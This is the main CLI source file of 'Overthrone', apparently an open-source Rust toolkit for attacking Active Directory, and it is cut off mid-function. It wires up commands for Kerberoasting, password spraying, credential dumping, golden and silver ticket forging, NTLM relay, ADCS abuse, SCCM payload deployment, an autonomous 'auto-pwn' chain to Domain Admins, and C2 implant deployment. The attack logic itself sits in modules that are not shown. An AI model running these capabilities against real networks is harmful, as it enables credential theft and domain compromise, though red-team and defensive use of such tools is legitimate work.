// Overthrone CLI — Active Directory Offensive Toolkit

mod auth;
mod autopwn;
mod banner;
mod commands;
mod commands_impl;
mod interactive_shell;
mod tui;

use auth::{AuthMethod, Credentials};
use autopwn::ExecMethod;
use clap::{Parser, Subcommand};
use colored::Colorize;
use overthrone_reaper::runner::ReaperConfig;
use tracing_subscriber::{EnvFilter, fmt};

use overthrone_core::c2::{C2Auth, C2Config, C2Framework, C2Manager};
use overthrone_core::graph::AttackGraph;
use overthrone_core::plugin::{PluginContext, PluginRegistry};
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

// ──────────────────────────────────────────────────────────
// CLI Definition
// ──────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "overthrone",
    version,
    about = "Active Directory Offensive Toolkit",
    long_about = "Overthrone — AD enumeration, attack path analysis, and exploitation framework.\n\
    Written in Rust for speed and stealth."
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,

    #[arg(
        short = 'H',
        long,
        global = true,
        env = "OT_DC_HOST",
        alias = "dc",
        alias = "dc-ip"
    )]
    dc_host: Option<String>,

    #[arg(short, long, global = true, env = "OT_DOMAIN")]
    domain: Option<String>,

    #[arg(short, long, global = true, env = "OT_USERNAME")]
    username: Option<String>,

    #[arg(
        short = 'p',
        long,
        global = true,
        env = "OT_PASSWORD",
        hide_env_values = true
    )]
    password: Option<String>,

    #[arg(long, global = true, env = "OT_NT_HASH", hide_env_values = true)]
    nt_hash: Option<String>,

    #[arg(long, global = true, env = "KRB5CCNAME")]
    ticket: Option<String>,

    #[arg(
        short = 'A',
        long,
        global = true,
        value_enum,
        default_value = "password"
    )]
    auth_method: AuthMethod,

    #[arg(short, long, global = true, action = clap::ArgAction::Count)]
    verbose: u8,

    #[arg(short, long, global = true, value_enum, default_value = "text")]
    output: OutputFormat,

    #[arg(short = 'O', long, global = true)]
    outfile: Option<String>,
}

#[derive(Clone, clap::ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

#[derive(Subcommand)]
enum Commands {
    /// Interactive wizard mode for AD engagements
    Wizard {
        #[command(flatten)]
        args: commands::wizard::WizardArgs,
    },

    /// Full AD enumeration via reaper modules
    Reaper {
        #[arg(long, env = "OT_DC_IP", alias = "dc", alias = "dc-host")]
        dc_ip: Option<String>,
        #[arg(long, short, value_delimiter = ',')]
        modules: Vec<String>,
        #[arg(long, default_value = "500")]
        page_size: u32,
    },

    /// Enumerate specific AD object types
    Enum {
        #[arg(value_enum)]
        target: EnumTarget,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },

    /// Kerberos operations
    #[command(alias = "krb", alias = "roast")]
    Kerberos {
        #[command(subcommand)]
        action: KerberosAction,
    },

    /// SMB operations
    Smb {
        #[command(subcommand)]
        action: SmbAction,
    },

    /// Remote command execution
    Exec {
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        command: String,
    },

    /// Attack graph operations
    Graph {
        #[command(subcommand)]
        action: GraphAction,
    },

    /// Password spraying
    Spray {
        #[arg(short, long)]
        password: String,
        #[arg(short = 'U', long, alias = "users")]
        userlist: String,
        #[arg(long, default_value = "1")]
        delay: u64,
        #[arg(long, default_value = "0")]
        jitter: u64,
    },

    /// Autonomous attack chain
    #[command(name = "auto-pwn", alias = "auto", alias = "autopwn")]
    AutoPwn {
        #[arg(short, long, default_value = "Domain Admins")]
        target: String,
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(long, default_value = "false")]
        stealth: bool,
        #[arg(long, default_value = "false")]
        dry_run: bool,
    },

    /// Credential dumping (SAM, LSA, NTDS, DCC2)
    Dump {
        #[arg(short, long)]
        target: String,
        #[arg(value_enum)]
        source: DumpSource,
    },

    /// Environment diagnostics — check dependencies and connectivity
    #[command(alias = "check", alias = "env")]
    Doctor {
        /// Specific checks to run (smb, kerberos, winrm, network)
        #[arg(long, short, value_delimiter = ',')]
        checks: Vec<String>,
        /// Domain controller to test connectivity against
        #[arg(long)]
        dc: Option<String>,
    },

    /// Generate engagement report (Markdown, PDF, JSON)
    Report {
        /// Input engagement state file
        #[arg(long, default_value = "engagement.json")]
        input: String,
        /// Output report file
        #[arg(short, long, default_value = "report.md")]
        output: String,
        /// Report format
        #[arg(short = 'F', long, value_enum, default_value = "markdown")]
        format: ReportFormat,
    },

    /// Ticket forging operations (golden, silver tickets)
    Forge {
        #[command(subcommand)]
        action: ForgeAction,
    },

    /// Crack captured hashes (AS-REP, Kerberoast, NTLM)
    Crack {
        /// Hash string to crack (auto-detects type)
        #[arg(short = 's', long)]
        hash: Option<String>,
        /// File containing hashes (one per line)
        #[arg(short, long)]
        file: Option<String>,
        /// Cracking mode (fast, default, thorough)
        #[arg(short = 'M', long, value_enum, default_value = "default")]
        mode: CrackMode,
        /// Custom wordlist file
        #[arg(short = 'W', long)]
        wordlist: Option<String>,
        /// Maximum candidates to try (0 = unlimited)
        #[arg(long, default_value = "0")]
        max_candidates: usize,
    },

    /// RID cycling — enumerate users/groups via MS-SAMR (works unauthenticated)
    #[command(alias = "rid-cycle", alias = "rid-brute")]
    Rid {
        /// Start RID (default: 500)
        #[arg(long, default_value = "500")]
        start_rid: u32,
        /// End RID (default: 10500)
        #[arg(long, default_value = "10500")]
        end_rid: u32,
        /// Use null session (no credentials)
        #[arg(long, default_value = "false")]
        null_session: bool,
    },

    /// Lateral movement — trust mapping, escalation paths, MSSQL chains
    #[command(alias = "lateral")]
    Move {
        #[command(subcommand)]
        action: MoveAction,
    },

    /// GPP password decryption — decrypt cpassword from Group Policy XML
    Gpp {
        /// Path to local Groups.xml or similar GPP XML file
        #[arg(long)]
        file: Option<String>,
        /// Decrypt a raw cpassword string directly
        #[arg(long)]
        cpassword: Option<String>,
    },

    /// LAPS password reading — read local admin passwords from AD
    Laps {
        /// Only query a specific computer name
        #[arg(long)]
        computer: Option<String>,
    },

    /// Secrets dumping — offline SAM/LSA/DCC2 from registry hives
    Secrets {
        #[command(subcommand)]
        action: SecretsAction,
    },

    /// NTLM relay and responder — LLMNR/NBT-NS poisoning and credential relay
    #[command(alias = "relay")]
    Ntlm {
        #[command(subcommand)]
        action: NtlmAction,
    },

    /// ADCS certificate abuse — ESC1-ESC8 attacks
    #[command(alias = "adcs", alias = "certify")]
    Adcs {
        #[command(subcommand)]
        action: AdcsAction,
    },

    /// Interactive shell — persistent remote session
    #[command(alias = "shell")]
    Shell {
        /// Target host
        #[arg(short, long)]
        target: String,
        /// Shell type
        #[arg(short = 'T', long, value_enum, default_value = "winrm")]
        shell_type: ShellType,
    },

    /// SCCM/MECM abuse — client push, app deployment
    #[command(alias = "sccm", alias = "mecm")]
    Sccm {
        #[command(subcommand)]
        action: SccmAction,
    },

    /// Port scanner — lightweight network reconnaissance
    #[command(alias = "scan", alias = "portscan")]
    Scan {
        /// Target hosts (IP, CIDR, or range)
        #[arg(short, long, required = true)]
        targets: String,
        /// Port range (e.g., 80,443 or 1-65535)
        #[arg(short, long, default_value = "top1000")]
        ports: String,
        /// Scan type
        #[arg(short = 'T', long, value_enum, default_value = "connect")]
        scan_type: ScanType,
        /// Timeout in milliseconds
        #[arg(long, default_value = "1000")]
        timeout: u64,
    },

    /// MSSQL operations — query execution, linked servers, xp_cmdshell
    #[command(alias = "mssql", alias = "sql")]
    Mssql {
        #[command(subcommand)]
        action: MssqlAction,
    },

    /// Launch interactive TUI with live attack graph
    #[clap(alias = "ui")]
    Tui {
        /// Domain to crawl
        #[arg(short, long)]
        domain: String,
        /// Start crawler automatically
        #[arg(short = 'c', long, default_value_t = true)]
        crawl: bool,
        /// Load graph from previous JSON export
        #[arg(short = 'l', long)]
        load: Option<String>,
    },

    // ─── NEW: Plugin System ──────────────────────────────────
    /// Plugin management — load, list, execute custom modules
    #[clap(alias = "plug")]
    Plugin {
        #[clap(subcommand)]
        action: PluginAction,
    },

    // ─── NEW: C2 Integration ─────────────────────────────────
    /// C2 framework integration — Cobalt Strike, Sliver, Havoc
    C2 {
        #[clap(subcommand)]
        action: C2Action,
    },
}

// ──────────────────────────────────────────────────────────
// Cracking mode configuration
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, clap::ValueEnum)]
enum CrackMode {
    /// Fast mode - minimal rules, quick cracking
    Fast,
    /// Default mode - balanced rules and speed
    Default,
    /// Thorough mode - all rules, exhaustive search
    Thorough,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ReportFormat {
    Markdown,
    Pdf,
    Json,
}

// ──────────────────────────────────────────────────────────
// Forge sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum ForgeAction {
    /// Forge a Golden Ticket (TGT using krbtgt hash)
    Golden {
        /// Domain SID (e.g., S-1-5-21-...)
        #[arg(long)]
        domain_sid: String,
        /// User to impersonate (default: Administrator)
        #[arg(long, default_value = "Administrator")]
        user: String,
        /// User RID (default: 500 for Administrator)
        #[arg(long, default_value = "500")]
        rid: u32,
        /// krbtgt NT hash (32 hex chars)
        #[arg(long)]
        krbtgt_hash: String,
        /// Output file for the ticket
        #[arg(short, long, default_value = "golden.kirbi")]
        output: String,
    },
    /// Forge a Silver Ticket (TGS using service account hash)
    Silver {
        /// Domain SID
        #[arg(long)]
        domain_sid: String,
        /// User to impersonate
        #[arg(long, default_value = "Administrator")]
        user: String,
        /// User RID
        #[arg(long, default_value = "500")]
        rid: u32,
        /// Target SPN (e.g., cifs/dc01.corp.local)
        #[arg(long)]
        spn: String,
        /// Service account NT hash
        #[arg(long)]
        service_hash: String,
        /// Output file for the ticket
        #[arg(short, long, default_value = "silver.kirbi")]
        output: String,
    },
}

// ──────────────────────────────────────────────────────────
// Enum targets
// ──────────────────────────────────────────────────────────

#[derive(Clone, clap::ValueEnum)]
enum EnumTarget {
    Users,
    Computers,
    Groups,
    Trusts,
    Spns,
    Asrep,
    Delegations,
    Gpos,
    All,
}

// ──────────────────────────────────────────────────────────
// Kerberos sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum KerberosAction {
    Roast {
        #[arg(long)]
        spn: Option<String>,
    },
    AsrepRoast {
        /// File with usernames to roast (one per line)
        #[arg(short = 'U', long)]
        userlist: Option<String>,
    },
    GetTgt,
    GetTgs {
        #[arg(long)]
        spn: String,
    },
}

// ──────────────────────────────────────────────────────────
// SMB sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum SmbAction {
    Shares {
        #[arg(short, long)]
        target: String,
    },
    Admin {
        #[arg(short, long)]
        targets: String,
    },
    Spider {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = ".kdbx,.key,.pem,.config,.ps1,.rdp")]
        extensions: String,
    },
    Get {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        path: String,
    },
    Put {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        local: String,
        #[arg(short, long)]
        remote: String,
    },
}

// ──────────────────────────────────────────────────────────
// Graph sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GraphAction {
    Build,
    Path {
        #[arg(short, long)]
        from: String,
        #[arg(short, long)]
        to: String,
    },
    PathToDa {
        #[arg(short, long)]
        from: String,
    },
    Stats,
    Export {
        #[arg(short, long, default_value = "graph.json")]
        output: String,
        /// Export in BloodHound-compatible format
        #[arg(short = 'B', long)]
        bloodhound: bool,
    },
}

// ──────────────────────────────────────────────────────────
// Dump sources
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, clap::ValueEnum)]
enum DumpSource {
    Sam,
    Lsa,
    Ntds,
    Dcc2,
}

// ──────────────────────────────────────────────────────────
// Move sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum MoveAction {
    /// Display trust relationships from LDAP enumeration
    Trusts,
    /// Find cross-domain escalation paths
    Escalation,
    /// Analyze MSSQL linked servers for cross-domain chains
    Mssql,
    /// Print full trust map visualization
    Map,
}

// ──────────────────────────────────────────────────────────
// Secrets sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum SecretsAction {
    /// Dump SAM hive — extract local account NTLM hashes
    Sam {
        /// Path to SAM registry hive file
        #[arg(long)]
        sam: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
    /// Dump LSA secrets — service account passwords, DPAPI keys
    Lsa {
        /// Path to SECURITY registry hive file
        #[arg(long)]
        security: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
    /// Dump DCC2 cached domain credentials (mscash2)
    Dcc2 {
        /// Path to SECURITY registry hive file
        #[arg(long)]
        security: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
}

// ──────────────────────────────────────────────────────────
// NTLM sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum NtlmAction {
    /// Capture NTLM hashes (Responder-style)
    Capture {
        /// Network interface to listen on
        #[arg(short, long, default_value = "0.0.0.0")]
        interface: String,
        /// Port to listen on
        #[arg(short, long, default_value = "445")]
        port: u16,
    },
    /// Relay NTLM authentication to targets
    Relay {
        /// Target hosts (format: ip:port)
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Listen port
        #[arg(short, long, default_value = "445")]
        port: u16,
        /// Command to execute on successful relay
        #[arg(short, long)]
        command: Option<String>,
    },
    /// SMB-specific relay with signing bypass
    SmbRelay {
        /// Target SMB hosts
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// SMB port
        #[arg(short, long, default_value = "445")]
        port: u16,
        /// Command to execute
        #[arg(short, long)]
        command: Option<String>,
    },
    /// HTTP/HTTPS relay
    HttpRelay {
        /// Target HTTP hosts
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// HTTP port
        #[arg(short, long, default_value = "80")]
        port: u16,
        /// Command to execute via WinRM
        #[arg(short, long)]
        command: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// ADCS sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum AdcsAction {
    /// Enumerate certificate templates and ADCS configuration
    Enum {
        /// Target CA server
        #[arg(short, long)]
        ca: Option<String>,
    },
    /// ESC1 — Web Enrollment with SAN abuse
    Esc1 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short, long, required = true)]
        target_user: String,
        #[arg(short, long, default_value = "esc1_cert.pfx")]
        output: String,
    },
    /// ESC2 — Web Enrollment with any template
    Esc2 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short, long, default_value = "esc2_cert.pfx")]
        output: String,
    },
    /// ESC3 — Enrollment Agent abuse
    Esc3 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        agent_template: String,
        #[arg(short, long, required = true)]
        target_template: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC4 — Vulnerable certificate template ACLs
    Esc4 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
    },
    /// ESC5 — Vulnerable CA configuration
    Esc5 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
    Esc6 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC7 — Vulnerable CA permissions
    Esc7 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC8 — ADCS Web Enrollment relay
    Esc8 {
        #[arg(short, long, required = true)]
        url: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// Request a certificate
    Request {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short, long)]
        subject: Option<String>,
        #[arg(short = 'A', long)]
        san: Option<String>,
        #[arg(short, long, default_value = "cert.pfx")]
        output: String,
    },
}

// ──────────────────────────────────────────────────────────
// SCCM sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum SccmAction {
    /// Enumerate SCCM/MECM configuration
    Enum {
        /// SCCM site server
        #[arg(short, long)]
        site_server: Option<String>,
    },
    /// Abuse SCCM for lateral movement
    Abuse {
        /// Target site server
        #[arg(short, long, required = true)]
        site_server: String,
        /// Abuse technique
        #[arg(short, long, value_enum, default_value = "client-push")]
        technique: SccmTechnique,
    },
    /// Deploy malicious application
    Deploy {
        /// Target collection
        #[arg(short, long, required = true)]
        collection: String,
        /// Application name
        #[arg(short, long, required = true)]
        app_name: String,
        /// Payload path
        #[arg(short, long, required = true)]
        payload: String,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum SccmTechnique {
    /// Client push installation abuse
    ClientPush,
    /// Application deployment abuse
    AppDeploy,
    /// Task sequence abuse
    TaskSequence,
    /// Collection modification
    CollectionMod,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ShellType {
    /// WinRM-based shell
    Winrm,
    /// SMB-based shell (PsExec style)
    Smb,
    /// WMI-based shell
    Wmi,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ScanType {
    /// SYN scan (requires raw sockets/root)
    Syn,
    /// TCP connect scan
    Connect,
    /// ACK scan (firewall mapping)
    Ack,
}

// ──────────────────────────────────────────────────────────
// MSSQL sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum MssqlAction {
    /// Execute SQL query on target server
    Query {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        query: String,
        #[arg(short, long, default_value = "master")]
        database: String,
    },
    /// Execute command via xp_cmdshell
    XpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        command: String,
    },
    /// Enumerate linked servers
    LinkedServers {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Enable xp_cmdshell on target
    EnableXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Check if xp_cmdshell is enabled
    CheckXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum PluginAction {
    /// List all loaded plugins
    List,
    /// Show info about a specific plugin
    Info {
        /// Plugin ID
        plugin_id: String,
    },
    /// Execute a plugin command
    Exec {
        /// Plugin command name
        command: String,
        /// Command arguments (--key value pairs)
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        args: Vec<String>,
    },
    /// Load a plugin from a file path
    Load {
        /// Path to .so/.dll/.wasm file
        path: String,
    },
    /// Unload a plugin by ID
    Unload {
        /// Plugin ID
        plugin_id: String,
    },
    /// Enable a disabled plugin
    Enable {
        /// Plugin ID
        plugin_id: String,
    },
    /// Disable a plugin without unloading
    Disable {
        /// Plugin ID
        plugin_id: String,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: C2 sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum C2Action {
    /// Connect to a C2 teamserver
    Connect {
        /// Framework: cs, sliver, havoc
        framework: String,
        /// Teamserver host
        host: String,
        /// Teamserver port
        port: u16,
        /// Password (for Cobalt Strike)
        #[arg(long)]
        password: Option<String>,
        /// Token (for Havoc)
        #[arg(long)]
        token: Option<String>,
        /// Sliver operator config file path
        #[arg(long)]
        config: Option<String>,
        /// Channel name
        #[arg(long, default_value = "default")]
        name: Option<String>,
        /// Skip TLS verification
        #[arg(long)]
        skip_verify: bool,
    },
    /// Show C2 channels and active sessions
    Status,
    /// Execute a command on a C2 session
    Exec {
        /// Session/beacon ID
        session_id: String,
        /// Command to execute
        command: String,
        /// Use PowerShell
        #[arg(short = 'p', long)]
        powershell: bool,
    },
    /// Deploy an implant to a target
    Deploy {
        /// C2 channel name
        channel: String,
        /// Target hostname or IP
        target: String,
        /// Listener name on the teamserver
        listener: String,
    },
    /// Disconnect from a C2 teamserver
    Disconnect {
        /// Channel name (or 'all')
        channel: String,
    },
    /// List available listeners on a C2 teamserver
    Listeners {
        /// Channel name
        channel: String,
    },
}

// ──────────────────────────────────────────────────────────
// Main
// ──────────────────────────────────────────────────────────

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    let filter = match cli.verbose {
        0 => "warn",
        1 => "info",
        2 => "debug",
        _ => "trace",
    };

    fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
        )
        .with_target(false)
        .compact()
        .init();

    banner::print_banner();

    let exit_code = match cli.command {
        Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
            Ok(_) => 0,
            Err(e) => {
                banner::print_fail(&format!("Wizard error: {}", e));
                1
            }
        },
        Commands::Reaper {
            ref dc_ip,
            ref modules,
            page_size,
        } => cmd_reaper(&cli, dc_ip.clone(), modules.clone(), page_size).await,
        Commands::Enum {
            ref target,
            ref filter,
            include_disabled,
        } => cmd_enum(&cli, target.clone(), filter.clone(), include_disabled).await,
        Commands::Kerberos { ref action } => cmd_kerberos(&cli, action.clone()).await,
        Commands::Smb { ref action } => cmd_smb(&cli, action.clone()).await,
        Commands::Exec {
            ref method,
            ref target,
            ref command,
        } => cmd_exec(&cli, method.clone(), target, command).await,
        Commands::Graph { ref action } => cmd_graph(&cli, action.clone()).await,
        Commands::Spray {
            ref password,
            ref userlist,
            delay,
            jitter,
        } => cmd_spray(&cli, password, userlist, delay, jitter).await,
        Commands::AutoPwn {
            ref target,
            ref method,
            stealth,
            dry_run,
        } => cmd_autopwn(&cli, target, method.clone(), stealth, dry_run).await,
        Commands::Dump { ref target, ref source } => {
            commands_impl::cmd_dump(&cli, target, source.clone()).await
        }
        Commands::Doctor { ref checks, ref dc } => {
            commands_impl::cmd_doctor(&cli, checks.clone(), dc.as_deref()).await
        }
        Commands::Report {
            ref input,
            ref output,
            ref format,
        } => commands_impl::cmd_report(&cli, input, output, format.clone()).await,
        Commands::Forge { ref action } => commands_impl::cmd_forge(&cli, action).await,
        Commands::Crack {
            ref hash,
            ref file,
            ref mode,
            ref wordlist,
            max_candidates,
        } => {
            commands_impl::cmd_crack(
                &cli,
                hash.as_deref(),
                file.as_deref(),
                mode.clone(),
                wordlist.as_deref(),
                max_candidates,
            )
            .await
        }
        Commands::Rid {
            start_rid,
            end_rid,
            null_session,
        } => commands_impl::cmd_rid(&cli, start_rid, end_rid, null_session).await,
        Commands::Move { ref action } => commands_impl::cmd_move(&cli, action).await,
        Commands::Gpp { ref file, ref cpassword } => {
            commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await
        }
        Commands::Laps { ref computer } => commands_impl::cmd_laps(&cli, computer.as_deref()).await,
        Commands::Secrets { ref action } => commands_impl::cmd_secrets(action).await,
        Commands::Ntlm { ref action } => cmd_ntlm(action.clone()).await,
        Commands::Adcs { ref action } => commands_impl::cmd_adcs(&cli, action).await,
        Commands::Shell { ref target, ref shell_type } => {
            commands_impl::cmd_shell(target, shell_type).await
        }
        Commands::Sccm { ref action } => commands_impl::cmd_sccm(action).await,
        Commands::Scan {
            ref targets,
            ref ports,
            ref scan_type,
            timeout,
        } => commands_impl::cmd_scan(targets, ports, scan_type, timeout).await,
        Commands::Mssql { ref action } => cmd_mssql(&cli, action.clone()).await,
        Commands::Tui {
            ref domain,
            crawl,
            ref load,
        } => commands_impl::cmd_tui(&cli, domain, crawl, load.as_deref()).await,

        // ─── NEW: Plugin handler ─────────────────────────────
        Commands::Plugin { ref action } => {
            let mut plugin_registry = PluginRegistry::new();
            let ctx = make_plugin_context(&cli);
            commands_impl::cmd_plugin(&cli, &mut plugin_registry, &ctx, action.clone()).await
        }

        // ─── NEW: C2 handler ─────────────────────────────────
        Commands::C2 { ref action } => {
            let mut c2_manager = C2Manager::new();
            commands_impl::cmd_c2(&mut c2_manager, action.clone()).await
        }
    };

    std::process::exit(exit_code);
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin Context Helper
// ──────────────────────────────────────────────────────────

fn make_plugin_context(cli: &Cli) -> PluginContext {
    let domain = cli.domain.clone().unwrap_or_else(|| "local".to_string());
    PluginContext {
        domain,
        dc_ip: cli.dc_host.clone(),
        credentials: None,
        graph: Arc::new(RwLock::new(AttackGraph::new())),
        state: Arc::new(RwLock::new(HashMap::new())),
        log_prefix: "cli".to_string(),
    }
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin command handler
// ──────────────────────────────────────────────────────────

#[allow(dead_code)]
async fn cmd_plugin(cli: &Cli, registry: &mut PluginRegistry, action: PluginAction) -> i32 {
    banner::print_module_banner("PLUGIN SYSTEM");

    let ctx = make_plugin_context(cli);

    match action {
        PluginAction::List => {
            println!("{}", "Listing loaded plugins...".bright_black());
            let plugins = registry.list();
            if plugins.is_empty() {
                println!("{}", "No plugins loaded.".yellow());
            } else {
                for p in plugins {
                    println!(
                        "- {} (v{}) by {}",
                        p.name.cyan(),
                        p.version,
                        p.author.yellow()
                    );
                }
            }
            println!(
                "{}",
                "Plugin registry: use interactive shell for full plugin management".yellow()
            );
            banner::print_success("Plugin list completed");
        }
        PluginAction::Info { plugin_id } => {
            println!(
                "{} Querying plugin: {}",
                "ℹ".bright_black(),
                plugin_id.cyan()
            );
            if let Some(plugin) = registry.get(&plugin_id) {
                let m = plugin.manifest();
                println!("Name: {}", m.name.cyan());
                println!("Version: {}", m.version);
                println!("Author: {}", m.author.yellow());
                println!("Description: {}", m.description);
                banner::print_success("Plugin info retrieved");
            } else {
                banner::print_fail(&format!("Plugin '{}' not found in registry", plugin_id));
            }
        }
        PluginAction::Exec { command, args } => {
            println!(
                "{} Executing plugin command: {} {}",
                "⚡".bright_black(),
                command.cyan(),
                args.join(" ").yellow()
            );

            let mut arg_map = HashMap::new();
            for chunk in args.chunks(2) {
                if chunk.len() == 2 {
                    arg_map.insert(chunk[0].replace("--", ""), chunk[1].clone());
                } else if chunk.len() == 1 {
                    arg_map.insert(chunk[0].replace("--", ""), "true".to_string());
                }
            }

            match registry.execute_command(&command, &arg_map, &ctx).await {
                Ok(res) => {
                    if res.success {
                        println!("{}", res.output);
                        banner::print_success("Plugin command executed");
                    } else {
                        banner::print_fail(&format!("Plugin command failed: {}", res.output));
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Error executing plugin command: {}", e));
                }
            }
        }
        PluginAction::Load { path } => {
            println!(
                "{} Loading plugin from: {}",
                "📦".bright_black(),
                path.cyan()
            );
            registry.add_search_path(&path);
            let _ = registry.discover_and_load(&ctx).await;
            banner::print_success(&format!("Plugin loaded from {}", path));
        }
        PluginAction::Unload { plugin_id } => {
            println!(
                "{} Unloading plugin: {}",
                "🗑".bright_black(),
                plugin_id.cyan()
            );
            if let Err(e) = registry.unload(&plugin_id).await {
                banner::print_fail(&format!("Failed to unload: {}", e));
            } else {
                banner::print_success(&format!("Plugin '{}' unloaded", plugin_id));
            }
        }
        PluginAction::Enable { plugin_id } => {
            println!(
                "{} Enabling plugin: {}",
                "✓".bright_black(),
                plugin_id.cyan()
            );
            registry.enable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' enabled", plugin_id));
        }
        PluginAction::Disable { plugin_id } => {
            println!(
                "{} Disabling plugin: {}",
                "✗".bright_black(),
                plugin_id.cyan()
            );
            registry.disable(&plugin_id);
            banner::print_success(&format!("Plugin '{}' disabled", plugin_id));
        }
    }
    0
}

// ──────────────────────────────────────────────────────────
// NEW: C2 command handler
// ──────────────────────────────────────────────────────────

#[allow(dead_code)]
async fn cmd_c2(manager: &mut C2Manager, action: C2Action) -> i32 {
    banner::print_module_banner("C2 INTEGRATION");

    match action {
        C2Action::Connect {
            framework,
            host,
            port,
            password,
            token,
            config,
            name,
            skip_verify,
        } => {
            println!(
                "{} Connecting to {} at {}:{}...",
                "⚡".bright_black(),
                framework.to_uppercase().cyan(),
                host.cyan(),
                port.to_string().cyan()
            );
            if skip_verify {
                println!("{}", "  ⚠ TLS verification disabled".yellow());
            }
            let channel_name = name.clone().unwrap_or_else(|| "default".to_string());

            let fw_enum = match framework.to_lowercase().as_str() {
                "cs" | "cobaltstrike" => C2Framework::CobaltStrike,
                "sliver" => C2Framework::Sliver,
                "havoc" => C2Framework::Havoc,
                _ => C2Framework::Custom(framework.clone()),
            };

            let auth = if let Some(p) = password {
                C2Auth::Password { password: p }
            } else if let Some(t) = token {
                C2Auth::Token { token: t }
            } else if let Some(c) = config {
                C2Auth::SliverConfig { config_path: c }
            } else {
                C2Auth::Token {
                    token: String::new(),
                }
            };

            let c2_config = C2Config {
                framework: fw_enum.clone(),
                host,
                port,
                auth,
                tls: true,
                tls_skip_verify: skip_verify,
                timeout: std::time::Duration::from_secs(10),
                auto_reconnect: false,
            };

            // Assuming channel is added by a plugin or built-in, connect it.
            if let Err(e) = manager.connect(&channel_name, &c2_config).await {
                banner::print_fail(&format!("Failed to connect: {}", e));
            } else {
                banner::print_success(&format!("Connected to {} as '{}'", fw_enum, channel_name));
            }
        }
        C2Action::Status => {
            println!("{}", "Querying C2 channels and sessions...".bright_black());
            let stats = manager.status();
            if stats.is_empty() {
                println!(
                    "{}",
                    "No C2 channels configured. Use 'c2 connect' first.".yellow()
                );
            } else {
                for (name, fw, conn) in stats {
                    let st = if conn {
                        "Connected".green()
                    } else {
                        "Disconnected".red()
                    };
                    println!("- {}: {} ({})", name.cyan(), fw, st);
                }
            }
        }
        C2Action::Exec {
            session_id,
            command,
            powershell,
        } => {
            let mode = if powershell { "PowerShell" } else { "Shell" };
            println!(
                "{} {} on session {}: {}",
                "⚡".bright_black(),
                mode,
                session_id.cyan(),
                command.yellow()
            );
            if let Ok(ch) = manager.default_channel() {
